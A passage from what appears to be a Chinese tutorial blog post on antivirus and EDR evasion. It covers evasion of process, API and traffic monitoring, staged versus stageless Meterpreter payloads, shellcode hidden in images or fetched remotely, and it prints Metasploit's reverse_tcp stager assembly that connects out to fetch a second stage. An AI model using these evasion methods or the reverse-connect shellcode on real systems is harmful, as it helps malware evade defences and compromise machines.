  2. 组策略
  3. 防火墙
  4. 敏感程序（cmd powershell wmi psexec bitsadmin rundll 等）
  5. 各种 win32api
这里强调一下，监控进程调用的api不止是api名字，还包括api的 调用顺序、调用源、参数等等 。 相应的bypass，
        用实现同样功能的api替换
    重写对应的api
    调用0环的api绕过3环杀软
等等，肯定不止这些， 说起来很容易，但具体实现需要很深的底层功底，起码对Windows操作系统的底层实现，win32api等很熟悉，这就需要内功。
  6. 文件夹
        C:/windows/system32   
    C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    C:\tmp等敏感文件夹（cs、msf都会在tmp文件夹下生成一些东西）
**绕过** ：`白加黑`
算是一个很好的方法，指的是利用Windows系统的一些白文件去执行相应的敏感操作，就不会触发杀软警告，想一想，有哪个普通的程序去执行添加用户的操作呢？
说到底，白加黑解决的是 Windows里面 `信任与权限`的问题，Windows
都相信你，它一个杀软有什么办法，权限指的是你的权限是否比杀软的权限高，如果你在0环，杀软在3环，它也没有权限来管你，更不用说kill。
#### 网络相关
1. **流量特征** : cobalt strike 的通信协议，是由 RSA 传输 AES 的密钥，AES的密钥加密后续通信，这也是c2的常规通信手法，但未经修改的profile 和证书，很容易被检测到。
2. **内容特征** ：data字段是否存在命令相关的关键词加密特征（payload是否通讯加密，明文传输就会被查杀）
3. **结构特征** : 是否存在已知远控的通讯结构（ cs 中 beacon 有 sleep）
4. **IP** : 是否被情报系统标记为恶意
**绕过** :
  * tcp分段：指的是数据包在传输过程中切分后以小段传输(效果也不错，但是网络连接不好很容易断掉)
  * 内容加密：针对传输的内容，比如那些执行命令的字符串等等，加密混淆，加密还是不要用简单的编码，你简单的base64编码一下，杀软、edr等还是可以检测到，最好用非对称加密
  * 使用合法证书 ： 这个自己找渠道获得吧……
### payload基本结构
**分段传输** :
eg:
msfvenom 的`meterpreter/reverse_https`模块
stager：
stage0：初始shellcode（通常称为 _stage0_
）会创建一个新的连接到攻击者的机器并将更大的有效载荷（stage1）读入内存。收到有效载荷后，stage0 会将控制权交给新的更大的有效载荷。stage0
只负责建立通信连接，不能够执行命令(getuid、getsystem等)
stage1（metsrv）：stage0执行完后发送stage1到目标机器并写入内存，弹回meterpreter会话，我们在meterpreter里执行的命令，还有加载的模块（load
kiwi等）都是stage1的功劳
这里 Sending stage （175174 bytes） 可以看到体积比较大，就是stage1
很多分段加载骚思路也是基于stager来实现，初始投递的文件非常小，载入内存后，在内存中解密加载
加载器，然后加载器再解密加载shellcode。具体实现方法也多种多样，各种语言，c#，go等。
**整段传输** ：
一次性发送很大的stage
`meterpreter_reverse_https`
stageless：
建立通信连接+执行命令
可以看到两种stage的体积差别
显然这种效果不如stager的效果好。
再简单看一下stager的汇编，不需要全部看懂，只有这么多代码，找到关键的功能
`try_connect`
    ;-----------------------------------------------------------------------------;
    ; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
    ; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
    ; Version: 1.0 (24 July 2009)
    ;-----------------------------------------------------------------------------;
    [BITS 32]
    ; Input: EBP must be the address of 'api_call'.
    ; Output: EDI will be the socket for the connection to the server
    ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
    reverse_tcp:
      push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
      push 0x5F327377        ; ...
      push esp               ; Push a pointer to the "ws2_32" string on the stack.
      push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
      call ebp               ; LoadLibraryA( "ws2_32" )
      mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
      sub esp, eax           ; alloc some space for the WSAData structure
      push esp               ; push a pointer to this stuct
      push eax               ; push the wVersionRequested parameter
      push 0x006B8029        ; hash( "ws2_32.dll", "WSAStartup" )
      call ebp               ; WSAStartup( 0x0190, &WSAData );
      push eax               ; if we succeed, eax wil be zero, push zero for the flags param.
      push eax               ; push null for reserved parameter
      push eax               ; we do not specify a WSAPROTOCOL_INFO structure
      push eax               ; we do not specify a protocol
      inc eax                ;
      push eax               ; push SOCK_STREAM
      inc eax                ;
      push eax               ; push AF_INET
      push 0xE0DF0FEA        ; hash( "ws2_32.dll", "WSASocketA" )
      call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
      xchg edi, eax          ; save the socket for later, don't care about the value of eax after this
    set_address:
      push byte 0x05         ; retry counter
      push 0x0100007F        ; host 127.0.0.1
      push 0x5C110002        ; family AF_INET and port 4444
      mov esi, esp           ; save pointer to sockaddr struct
    try_connect:
      push byte 16           ; length of the sockaddr struct
      push esi               ; pointer to the sockaddr struct
      push edi               ; the socket
      push 0x6174A599        ; hash( "ws2_32.dll", "connect" )
      call ebp               ; connect( s, &sockaddr, 16 );
      test eax,eax           ; non-zero means a failure
      jz short connected
    handle_failure:
      dec dword [esi+8]
      jnz short try_connect
    failure:
      push 0x56A2B5F0        ; hardcoded to exitprocess for size
      call ebp
    connected:
因此可以看出stager仅仅是连接功能，而不能够进行其他操作。可以自己去GitHub找msf的模块来对比，文末也会放上链接。
​ 还要提一点：msf加载的各种命令 比如powershell kiwi这种，是各种反射注入的dll，反射注入到执行的进程上
其中的msf中的`进程迁移`：是在无文件落地的情况下，将内存中的shellcode注入到其他进程。
关于无文件落地，比较复杂，我太菜了，等研究到再单独写一篇…
下面说一点免杀的方法和思路：
### 分离免杀
因为shellcode在程序里面很容易被查杀，像下面是最常用的加载shellcode的方式，内联汇编执行，函数指针执行，强制转换等等，当然很明显，这几种现在都是不免杀的。
要提一下内联汇编中的 `_emit 0xff _emit 0xE0`是硬编码执行，与 `jmp eax /call
eax`的作用是一样的，网上有很多文章说是花指令，用来干扰杀软的，但在我实际测试中，删掉是无法加载shellcode的。
这里的分离免杀是用 msfvenom 生成一段raw格式的shellcode 放在 png 图片里，然后加载器 将shellcode写入内存中
经测试，可以简单的过掉火绒，360没有测试，会被小红伞杀。因为这里将shellcode写入内存的方式还是前面说的最简单的方式，换橙其他加载方式，应该也是可以过掉的。
分离免杀包括但不限于
    shellcode从文本提取 
    shellcode与加载器分离
    远程加载shellcode（shellcode放在另一台主机上，走http协议下载）
    管道运输
    隐写在图片上，powershell加载
具体的其他分离免杀可以去网上找对应的实现，这里仅仅介绍并提供思路。
当然传统的这些函数早已被杀软加入豪华套餐
    WinHttpOpen
    WinHttpConnect
    WinHttpOpenRequest
    WinHttpSendRequest
    WinHttpReceiveResponse
    WinHttpQueryDataAvailable
    WinHttpReadData
    WinHttpCloseHandle
但幸运的是，Windows 提供了许多不同的库，可用于下载数据，例如`winInet、WinHTTP 和 Windows
Sockets`。通过切换到更加手动的基于套接字的实现 ，如果使用这些第三方库或使用系统自带的下载命令，被杀软查杀的概率会小很多。
**其他免杀思路**
    远程线程注入远程加载管道传输白加黑父进程调用子进程
等等，还有其他骚思路……万变不离其宗
### 总结
做免杀，首先要原理烂熟于心，得知道为什么会被杀，杀的哪里，才有目的的去做，而不是啥都不懂，就去盲杀（在不清楚杀软规则好像也只能这样… 但是效率很低嘛）
前面也介绍了各种免杀的思路，可以自己去扩充，上面主要是基于c/cpp来实现，也可以用其他语言 powershell
/c#/go/nim/python等来实现。方法还是很多的，但前提是要有一定的底层知识储备。
下面两张图刚开始看会觉得很空，但仔细研究会发现做免杀就是根据这个步骤来的，整个流程很清晰，只不过在实现的过程中需要大量的底层知识来支撑罢了。
希望可以给大家带来一点帮助，祝大家早日拳打火眼，脚踢卡巴斯基，bypass全球杀软~
参考链接：  
[恶意程序编写之免杀基础 - SecPulse.COM |
安全脉搏](https://www.secpulse.com/archives/132175.html)  
[免杀的艺术：PE文件后门的植入（二） - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/25894246)  